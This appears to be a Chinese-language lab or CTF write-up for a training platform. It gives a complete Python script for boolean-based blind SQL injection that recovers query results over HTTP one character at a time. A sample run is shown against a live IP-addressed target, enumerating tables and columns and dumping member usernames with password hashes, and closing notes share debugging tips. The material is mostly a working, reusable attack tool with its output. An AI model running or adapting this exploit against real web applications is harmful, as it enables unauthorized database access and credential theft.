### boolian_blind_injection

#### 脚本如下：

~~~python
import urllib.request
import urllib.response
import urllib.parse


def exploit(tar, load, judge_con):
    i = 0
    length = 0
    out = ""

    while True:
        length += 1
        url = rf"{tar}%20and%20if(length(({load}))={length},1,0)"
        with urllib.request.urlopen(url) as res:
            content = res.read()
            content = content.decode("utf-8")
            if f"{judge_con}" in content:
                break

    field = list(range(97, 123))
    field.append(44)
    field.extend(range(48, 58))
    while i <= length:
        i += 1
        for j in field:
            j = chr(j)
            url = rf"{tar}%20and%20if(substr(({load}),{i},1)=%27{j}%27,1,0)"
            with urllib.request.urlopen(url) as res:
                content = res.read()
                content = content.decode("utf-8")
                if f"{judge_con}" in content:
                    out += j
                    print('\r' + out, end='')
                    break
        else:
            continue
    print("\n")


if __name__ == '__main__':
    target = input("target:")
    judgment_condition = input("judgment_condition:")
    while True:
        payload = urllib.parse.quote(input("payload:"))
        exploit(target, payload, judgment_condition)
~~~



#### 运行效果：

~~~
target:http://124.70.71.251:48570/new_list.php?id=1
judgment_condition:关于平台停机维护的通知
payload:select group_concat(table_name) from information_schema.tables where table_schema='stormgroup'
member,notice

payload:select group_concat(column_name) from information_schema.columns where table_name='member'
name,password,status

payload:select group_concat(name,password,status) from stormgroup.member
mozhe3114b433dece9180717f2b7de56b28a30,mozhe8099bed8b4ea601446f87cce34bc5d8d1

payload:
~~~



#### 总结：

1. substr()这个函数的第一个参数用括号括起来，之前一直出错就是没注意这个地方，写sql语句的时候一定要注意避免二义性，这里不加括号后面语句就有二义性了
2. 在手工注入时，空格直接转化为%20自动url编码，但在python里要编码一下才可以
3. 可以用二分法提高判断效率

